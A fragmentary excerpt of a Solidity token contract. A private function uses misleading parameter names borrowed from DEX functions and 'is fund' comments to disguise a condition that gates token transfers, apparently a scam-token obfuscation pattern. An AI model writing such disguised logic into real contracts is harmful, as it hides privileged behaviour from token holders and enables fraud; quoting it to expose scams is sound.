...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function boolenable(address setAutomatedMarketMakerPair, address removeLiquidityWithPermit) private view returns (bool){
        return (setAutomatedMarketMakerPair != removeLiquidityWithPermit
        /*is fund*/  || /*is fund*/
        setAutomatedMarketMakerPair != fundAddress);
    }
    ...
    function _tokenTransfer(
        ...
        if (boolenable(sender,recipient))
